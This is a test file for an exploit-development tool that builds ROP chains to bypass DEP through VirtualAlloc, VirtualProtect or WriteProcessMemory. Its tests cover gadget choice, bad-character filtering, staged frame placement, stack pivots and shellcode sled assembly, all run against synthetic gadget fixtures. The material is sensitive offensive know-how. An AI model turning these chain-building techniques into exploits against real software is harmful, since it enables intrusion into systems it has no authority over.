import { describe, expect, test } from "vitest";
import { buildExploit } from "../src/commands/dep_build";
import { stackSlot, stagedPops, stagingBase } from "../src/commands/dep_frames";
import { gadgetAddress, jobsFor, met, planJobs, planLines, planWrites, sequence } from "../src/commands/dep_plan";
import { SCREEN } from "../src/core/screenshot_rule";
import { buildCapabilityIndexFromRpPlusText } from "../src/rop";

// A skeleton chain carries the address of the field it is writing in one register and the value going
// into it in another, and the write gadget's two operands are what decide which is which. So the write
// gadget is not a free choice: every loader after it has to produce its value in one of those registers
// while keeping the other. These corpora are the smallest that make the two answers differ.

const corpus = (...lines: string[]) =>
  buildCapabilityIndexFromRpPlusText(lines.map((line, i) => `0x${(0x11110010 + i * 0x10).toString(16)}: ${line} ;  (1 found)`).join("\n"));

const BAD = [0x00, 0x0a, 0x0d];
const IAT_SLOT = 0x11225544;

// Two writes, and only one of them leaves the API's address reachable. `mov [edi], ecx` wants every
// value in ECX, and nothing here moves EAX into ECX, so the API, which can only be read into EAX by
// `mov eax, [eax]`, never gets there. `mov [ecx], eax` wants its values in EAX, where the read already
// puts them. Both write nothing and move ESP by four, so the old ranking cannot tell them apart and
// takes the lower address.
const TWO_WRITES = [
  "push esp ; pop esi ; ret",
  "add esi, ecx ; ret",
  "mov edi, esi ; ret",
  "mov ecx, esi ; ret",
  "mov dword [edi], ecx ; ret",
  "mov dword [ecx], eax ; ret",
  "mov eax, dword [eax] ; ret",
  "pop eax ; ret",
  "pop ecx ; ret",
  "inc edi ; ret",
  "inc ecx ; ret",
  "mov esp, edi ; ret",
  "mov esp, ecx ; ret",
];

describe("the skeleton style's registers, weighed against the frame", () => {
  const facts = { iatSlot: IAT_SLOT, writable: 0x11224444 };

  test("the write gadget is chosen by how much of the frame the corpus can then load", () => {
    const index = corpus(...TWO_WRITES);
    const { plans, tried } = planWrites(index, [], "VirtualProtect", facts, BAD);
    // Every candidate is weighed, and what each one can fill is the evidence for the choice.
    const byValue = Object.fromEntries(tried.map((trial) => [trial.value, trial]));
    expect(byValue.ecx.filled).toBeLessThan(byValue.eax.filled);
    expect(byValue.eax.field).toBe("ecx");
    expect(byValue.ecx.field).toBe("edi");
    const write = plans.filter((plan) => plan.job.key === "write")[0];
    expect(sequence(write.pick!.gadget)).toBe("mov dword [ecx], eax ; ret");
  });

  test("the copy lands the field address where the write reads it from", () => {
    const index = corpus(...TWO_WRITES);
    const { plans } = planWrites(index, [], "VirtualProtect", facts, BAD);
    const copy = plans.filter((plan) => plan.job.key === "copy")[0];
    const write = plans.filter((plan) => plan.job.key === "write")[0];
    expect(copy.pick?.at.dest ?? copy.path?.to).toBe(write.pick!.at.address);
    // Not the one the ranking reaches first: `mov edi, esi` sits at a lower address and is still usable.
    expect(sequence(copy.pick!.gadget)).toBe("mov ecx, esi ; ret");
  });

  test("a module with one write is left alone, and nothing is weighed", () => {
    const index = corpus(...TWO_WRITES.filter((line) => line !== "mov dword [ecx], eax ; ret"));
    const { plans, tried } = planWrites(index, [], "VirtualProtect", facts, BAD);
    expect(tried).toEqual([]);
    expect(sequence(plans.filter((plan) => plan.job.key === "write")[0].pick!.gadget)).toBe("mov dword [edi], ecx ; ret");
  });

  // The field address reaches the write's register by a sequence when no single gadget takes it there.
  test("with no single copy into the write's register, a path carries the field address", () => {
    const index = corpus(...TWO_WRITES.filter((line) => line !== "mov ecx, esi ; ret"), "xchg edi, ecx ; ret");
    const { plans } = planWrites(index, [], "VirtualProtect", facts, BAD);
    const copy = plans.filter((plan) => plan.job.key === "copy")[0];
    const write = plans.filter((plan) => plan.job.key === "write")[0];
    expect(write.pick!.at.address).toBe("ecx");
    expect(copy.path?.to).toBe("ecx");
    expect(copy.path!.gadgets.map(sequence)).toEqual(["mov edi, esi ; ret", "xchg edi, ecx ; ret"]);
  });
});

describe("the jobs a style needs, read off the API's frame", () => {
  test("only VirtualAlloc's frame computes its size, so only it needs a negate", () => {
    const keys = (api: "VirtualAlloc" | "VirtualProtect" | "WriteProcessMemory") => jobsFor("skeleton", api).map((job) => job.key);
    expect(keys("VirtualAlloc")).toContain("negate");
    expect(keys("VirtualProtect")).not.toContain("negate");
    expect(keys("WriteProcessMemory")).not.toContain("negate");
  });

  test("WriteProcessMemory's PUSHAD frame runs two registers short, so it asks for neither pop", () => {
    const keys = (api: "VirtualAlloc" | "WriteProcessMemory") => jobsFor("pushad", api).map((job) => job.key);
    expect(keys("VirtualAlloc")).toEqual(["read", "pop_esi", "pop_ebp", "pop_ebx", "pop_edx", "pop_ecx", "pop_edi", "pop_eax", "pushad"]);
    expect(keys("WriteProcessMemory")).toEqual(["read", "pop_ebx", "pop_edx", "pop_ecx", "pop_edi", "pop_eax", "pushad"]);
  });

  // The refusal this changes: a corpus with no `pop esi` and no `pop ebp` blocked every API before,
  // although WriteProcessMemory's frame touches neither register.
  test("a corpus without pop esi and pop ebp still has a complete PUSHAD frame for WriteProcessMemory", () => {
    const index = corpus("mov eax, dword [eax] ; ret", "pop eax ; ret", "pop ecx ; ret", "pop edx ; ret",
      "pop ebx ; ret", "pop edi ; ret", "pushad ; ret", "add esp, 0x0c ; ret");
    const unmet = (api: "VirtualAlloc" | "WriteProcessMemory") =>
      planJobs(index, "pushad", [], api).filter((plan) => !met(plan)).map((plan) => plan.job.key);
    expect(unmet("VirtualAlloc")).toEqual(["pop_esi", "pop_ebp"]);
    expect(unmet("WriteProcessMemory")).toEqual([]);
  });
});

// A staged chain lays the frame at a fixed writable address in the module, so every field's address is
// a constant it pops. The corpus below is the shape that forced the style: nothing in it moves one
// register into another and there is no pushad, so neither older style can work out where a frame in the
// stack buffer sits, and both refuse at the method layer. It still has everything a staged frame needs.
const NO_COPY = [
  "push esp ; pop eax ; ret",
  "add eax, ecx ; ret",
  "neg ecx ; ret",
  "neg eax ; ret",
  "mov eax, dword [eax] ; ret",
  "mov dword [ecx+0x4], eax ; ret",
  "xchg ecx, esp ; ret",
  "pop eax ; ret",
  "pop ecx ; ret",
];

describe("the staged style's jobs, read off the API's frame", () => {
  const keys = (api: "VirtualAlloc" | "VirtualProtect" | "WriteProcessMemory") => jobsFor("staged", api).map((job) => job.key);

  // The jobs the skeleton needs to work out one address at run time are what this style exists to do
  // without: there is no pointer to copy out of the captured ESP and none to walk from field to field.
  test("no copy and no advance, because a field address is a constant", () => {
    expect(keys("WriteProcessMemory")).toEqual(["capture", "add", "read", "field", "write", "pivot"]);
    expect(jobsFor("skeleton", "WriteProcessMemory").map((job) => job.key)).toContain("copy");
    expect(jobsFor("skeleton", "WriteProcessMemory").map((job) => job.key)).toContain("advance");
  });

  test("only VirtualAlloc's frame computes its size, so only it needs a negate", () => {
    expect(keys("VirtualAlloc")).toEqual(["capture", "add", "read", "negate", "field", "write", "pivot"]);
    expect(keys("VirtualProtect")).not.toContain("negate");
  });

  // ESP is wanted for one slot and one reason: the shellcode is in the payload, so its address is the
  // only value a staged frame cannot pop.
  test("the capture and the distance are there for the shellcode slot alone", () => {
    for (const job of ["capture", "add"]) expect(keys("VirtualProtect")).toContain(job);
  });
});

describe("a frame staged at a fixed address, where the two older styles are refused", () => {
  const facts = { iatSlot: IAT_SLOT, writable: 0x11224444, cave: 0x11114444 };
  const open = (style: "skeleton" | "pushad" | "staged") =>
    planWrites(corpus(...NO_COPY), [], "WriteProcessMemory", facts, BAD, style)
      .plans.filter((plan) => !met(plan)).map((plan) => plan.job.key);

  test("a corpus with no register copy and no pushad still has a complete staged frame", () => {
    expect(open("skeleton")).toContain("copy");
    expect(open("pushad")).toContain("pushad");
    expect(open("staged")).toEqual([]);
  });

  const build = (staging: number | undefined) => {
    const index = corpus(...NO_COPY);
    const { plans } = planWrites(index, [], "WriteProcessMemory", facts, BAD, "staged");
    return buildExploit({
      api: "WriteProcessMemory", style: "staged", module: "fixture.dll", badchars: BAD, index, plans,
      exclude: [], iatSlot: IAT_SLOT, writable: facts.writable, cave: facts.cave, staging, stage: 1,
    });
  };

  test("the only hole left is the shellcode, and each field is written at its own constant", () => {
    const made = build(0x11221408);
    expect(made.holes.map((hole) => hole.slice(0, hole.indexOf(":")))).toEqual(["shellcode"]);
    const chain = (made.blocks[7] as { lines: string[] }).lines.join("\n");
    // The write gadget stores to [ecx+4], so the chain pops each field's address minus four.
    expect(chain).toContain("c.rop(POP_ECX, STAGING - 0x4)");
    expect(chain).toContain("c.rop(POP_ECX, STAGING + 0x14)");
    // xchg ecx, esp takes no dword off the new stack, so its ret lands on field 1 from the base itself.
    expect(chain).toContain("c.rop(XCHG_ECX_ESP)");
    expect((made.blocks[6] as { lines: string[] }).lines[0]).toContain("STAGING = 0x11221408");
  });

  // `called` must be what the pasted file calls, and [4/7] puts a > on a pick only when it is in there.
  test("called is exactly the gadgets the pasted chain calls, and only those picks are marked", () => {
    const made = build(0x11221408);
    const lines = [5, 7].flatMap((at) => (made.blocks[at] as { lines: string[] }).lines).join("\n");
    const names = new Set([...lines.matchAll(/c\.rop\((\w+)/g)].map((match) => match[1]));
    expect(made.called.slice().sort()).toEqual(made.table.filter((entry) => names.has(entry.name)).map((entry) => entry.address).sort());
    const { plans } = planWrites(corpus(...NO_COPY), [], "WriteProcessMemory", facts, BAD, "staged");
    const called = new Set(made.called);
    for (const plan of plans.filter((entry) => entry.pick)) {
      const text = planLines(plan, 3, called).join("\n");
      expect(text.includes("\n  > "), plan.job.title).toBe(called.has(gadgetAddress(plan.pick!.gadget)));
    }
  });

  test("with no base for the frame the style says so instead of writing a chain", () => {
    const made = build(undefined);
    expect(made.holes[0]).toContain("no run of 28 writable bytes");
    expect((made.blocks[6] as { lines: string[] }).lines).toEqual([]);
  });

  // The pivot puts ESP on the frame and the call's ret leaves it there, so whatever the call returns into
  // runs on what is left of the module's writable section. Measured on T11: VirtualAlloc returned on about
  // 0x150 bytes of it and the shellcode then spent 0x2210 in one WinExec and faulted in .rdata a page
  // below the section. The sled's first instruction loads ESP back out of the frame field that already
  // holds its own stack address, so nothing after the call runs on the section.
  test("the sled starts by putting ESP back on the stack, out of the frame's own stack field", () => {
    const made = build(0x11221408);
    const seventh = (made.blocks[7] as { lines: string[] }).lines.join("\n");
    // WriteProcessMemory's lpBuffer is field 5, so the stack address sits at STAGING + 0x10.
    expect(seventh).toContain('restore = bytes.fromhex("8b25") + p32(STAGING + 0x10)');
    expect(seventh).toContain("mov esp, dword [STAGING + 0x10]");
    expect(seventh).toContain("payload += PAD * gap + restore + nops + shellcode");
    // The frame says which field it is, next to the field, so the [6/7] screenshot carries it.
    expect((made.blocks[6] as { lines: string[] }).lines.join("\n")).toContain("<- and the sled reads ESP back out of here");
  });

  // Those six bytes travel in the payload, so a bad char in them is the tool's problem, not the user's.
  // 0x8b rules the short form out and 0x94 the long one, and then there is no instruction left to emit.
  test("where no encoding of the restore is clean the run says so instead of sending a bad byte", () => {
    const index = corpus(...NO_COPY);
    const bad = [...BAD, 0x8b, 0x94];
    const { plans } = planWrites(index, [], "WriteProcessMemory", facts, bad, "staged");
    const made = buildExploit({
      api: "WriteProcessMemory", style: "staged", module: "fixture.dll", badchars: bad, index, plans,
      exclude: [], iatSlot: IAT_SLOT, writable: facts.writable, cave: facts.cave, staging: 0x11221408, stage: 1,
    });
    expect(made.holes.join("\n")).toContain("no clean encoding of STAGING + 0x10 into esp");
    expect((made.blocks[7] as { lines: string[] }).lines.join("\n")).not.toContain("restore =");
  });

  // Only the staged style pivots off the stack, so only its sled carries the restore. The other two leave
  // ESP on the stack and a prologue there would be six bytes of nothing.
  test("the skeleton style's sled carries no restore, because its frame never left the stack", () => {
    const index = corpus(...TWO_WRITES);
    const { plans } = planWrites(index, [], "VirtualAlloc", { iatSlot: IAT_SLOT }, BAD);
    const made = buildExploit({
      api: "VirtualAlloc", style: "skeleton", module: "fixture.dll", badchars: BAD, index, plans,
      exclude: [], iatSlot: IAT_SLOT, stage: 1,
    });
    const seventh = (made.blocks[7] as { lines: string[] }).lines.join("\n");
    expect(seventh).toContain("payload += PAD * gap + nops + shellcode");
    expect(seventh).toContain("size = len(nops + shellcode)");
    expect(seventh).not.toContain("restore");
  });
});

describe("where a staged frame can be laid", () => {
  const span = 0x1c;
  const plain = stagedPops("WriteProcessMemory", 0, 0);

  test("the base is dword-aligned and the whole frame fits the writable run", () => {
    // The highest base the run allows, because everything below the frame is the stack the call runs on.
    expect(stagingBase({ at: 0x11221412, size: 0x20 }, span, plain, BAD)).toBe(0x11221414);
    expect(stagingBase({ at: 0x11221410, size: 0x10 }, span, plain, BAD)).toBeUndefined();
  });

  // The refusal that makes the style unavailable rather than wrong: the run is longer than the frame and
  // still no good, because the chain pops each field's address and cannot send one of them.
  test("a run long enough for the frame is refused when a field address carries a bad char", () => {
    expect(stagingBase({ at: 0x11220a10, size: 0x20 }, span, plain, BAD)).toBeUndefined();
    expect(stagingBase({ at: 0x11221410, size: 0x20 }, span, plain, BAD)).toBe(0x11221414);
  });

  // A write gadget that stores to [reg+4] is handed each field's address minus four, so the dword below
  // the frame is popped too and a base whose predecessor is dirty is no use. Measured on T06, where the
  // base one dword lower put 0xE0 in the first address the chain sends.
  test("the write gadget's displacement moves the base, because it shifts every popped dword", () => {
    const run = { at: 0x112210e0, size: 0x40 };
    expect(stagingBase(run, span, plain, BAD)).toBe(0x11221104);
    // 0x11221100 holds a 00 and is the dword below that base, so the frame drops to where none of its
    // seven popped addresses touches it.
    expect(stagingBase(run, span, stagedPops("WriteProcessMemory", 4, 0), BAD)).toBe(0x112210e8);
  });

  test("the pivot's own pops are popped off the base as well", () => {
    expect(stagedPops("WriteProcessMemory", 4, 1)).toEqual([-4, 0, 4, 8, 0xc, 0x10, 0x14, -4, 0x10]);
    expect(stagedPops("VirtualProtect", 0, 0)).toEqual([0, 4, 8, 0xc, 0x10, 0x14, 0, 4]);
  });

  // The last offset is the one dword of the frame the chain does not pop: the field holding the sled's
  // stack address, which the sled loads ESP from, so its four bytes travel in the payload instead. A base
  // whose popped addresses are all clean and whose stack field is not would emit a sled nobody can send.
  // It bites only where the write gadget's displacement is large enough to lift every popped address off
  // that field, which is T11's `mov [ecx+0x20], eax`.
  test("the field the sled reads ESP back out of has to be clean too", () => {
    expect(stackSlot("VirtualAlloc")).toBe(1);
    expect(stackSlot("VirtualProtect")).toBe(1);
    expect(stackSlot("WriteProcessMemory")).toBe(4);
    const run = { at: 0x112209dc, size: 0x60 };
    const popped = stagedPops("VirtualAlloc", 0x20, 0).slice(0, -1);
    // Every dword this chain pops off 0x112209fc is clean, so the popped set alone takes that base.
    expect(stagingBase(run, 0x18, popped, BAD)).toBe(0x112209fc);
    // Its stack field is 0x11220a00, which carries two bad chars, so the frame drops one dword.
    expect(stagingBase(run, 0x18, stagedPops("VirtualAlloc", 0x20, 0), BAD)).toBe(0x112209f8);
  });
});

// T08's only memory read is `xchg dword [ecx], eax`. It reads the IAT slot and writes the old eax back in
// the same instruction, and on the clone that slot's page is PAGE_READONLY, so the read faults. The job
// list and the value search have to give the same answer about it, and the answer turns on the page.
describe("a read that writes back is a read only where the slot is writable", () => {
  const SWAP_ONLY = NO_COPY.map((line) => (line === "mov eax, dword [eax] ; ret" ? "xchg dword [ecx], eax ; ret" : line));
  const read = (slotWritable: boolean) =>
    planWrites(corpus(...SWAP_ONLY), [], "WriteProcessMemory", { iatSlot: IAT_SLOT, slotWritable, writable: 0x11224444, cave: 0x11114444 }, BAD, "staged")
      .plans.filter((plan) => plan.job.key === "read")[0];

  test("a read-only slot leaves the read job open, with the reason on the screen", () => {
    const plan = read(false);
    expect(met(plan)).toBe(false);
    expect(plan.verdicts[0].reason).toContain("read-only");
  });

  test("a writable slot lets the same gadget do it", () => {
    expect(read(true).pick && sequence(read(true).pick!.gadget)).toBe("xchg dword [ecx], eax ; ret");
  });
});

// T08's third swap is `xor eax, eax ; mov ecx, 0x631052d4 ; xchg dword [ecx], eax ; pop ebp ; ret`, long
// enough that its row ran to 133 columns once the read job printed it as a rejection.
test("a candidate too long for one row puts its side effects on the next", () => {
  const long = "xor eax, eax ; mov ecx, 0x11225544 ; xchg dword [ecx], eax ; pop ebp ; pop esi ; pop edi ; ret";
  const plan = planWrites(corpus(...NO_COPY.filter((line) => line !== "mov eax, dword [eax] ; ret"), long), [], "WriteProcessMemory",
    { iatSlot: IAT_SLOT, writable: 0x11224444, cave: 0x11114444 }, BAD, "staged").plans.filter((entry) => entry.job.key === "read")[0];
  const lines = planLines(plan);
  expect(lines.some((line) => line.indexOf("xchg dword [ecx], eax") >= 0)).toBe(true);
  for (const line of lines) expect(line.length, line).toBeLessThanOrEqual(SCREEN.columns);
});
